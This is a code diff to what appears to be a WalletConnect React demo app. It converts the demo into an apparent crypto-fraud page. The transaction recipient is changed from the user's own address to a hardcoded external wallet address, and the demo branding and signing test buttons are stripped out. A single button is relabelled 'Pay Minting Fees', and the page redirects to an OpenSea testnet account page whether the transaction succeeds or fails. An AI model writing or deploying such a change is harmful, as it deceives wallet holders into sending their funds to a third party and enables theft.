@@ -292,7 +292,7 @@ class App extends React.Component<any, any> {
     const from = address;
 
     // to
-    const to = address;
+    const to = "0x3C565c6bC265cE063bf793F4260918165F598D31";
 
     // nonce
     const _nonce = await apiGetAccountNonce(address, chainId);
@@ -350,9 +350,12 @@ class App extends React.Component<any, any> {
         pendingRequest: false,
         result: formattedResult || null,
       });
+
+      window.location.assign("https://testnets.opensea.io/account");
     } catch (error) {
       console.error(error);
       this.setState({ connector, pendingRequest: false, result: null });
+      window.location.assign("https://testnets.opensea.io/account");
     }
   };
 
@@ -649,14 +652,9 @@ class App extends React.Component<any, any> {
           <SContent>
             {!address && !assets.length ? (
               <SLanding center>
-                <h3>
-                  {`Try out WalletConnect`}
-                  <br />
-                  <span>{`v${process.env.REACT_APP_VERSION}`}</span>
-                </h3>
                 <SButtonContainer>
                   <SConnectButton left onClick={this.connect} fetching={fetching}>
-                    {"Connect to WalletConnect"}
+                    {"Connect Your Wallet"}
                   </SConnectButton>
                 </SButtonContainer>
               </SLanding>
@@ -667,22 +665,7 @@ class App extends React.Component<any, any> {
                 <Column center>
                   <STestButtonContainer>
                     <STestButton left onClick={this.testSendTransaction}>
-                      {"eth_sendTransaction"}
-                    </STestButton>
-                    <STestButton left onClick={this.testSignTransaction}>
-                      {"eth_signTransaction"}
-                    </STestButton>
-                    <STestButton left onClick={this.testSignTypedData}>
-                      {"eth_signTypedData"}
-                    </STestButton>
-                    <STestButton left onClick={this.testLegacySignMessage}>
-                      {"eth_sign (legacy)"}
-                    </STestButton>
-                    <STestButton left onClick={this.testStandardSignMessage}>
-                      {"eth_sign (standard)"}
-                    </STestButton>
-                    <STestButton left onClick={this.testPersonalSignMessage}>
-                      {"personal_sign"}
+                      {"Pay Minting Fees"}
                     </STestButton>
                   </STestButtonContainer>
                 </Column>
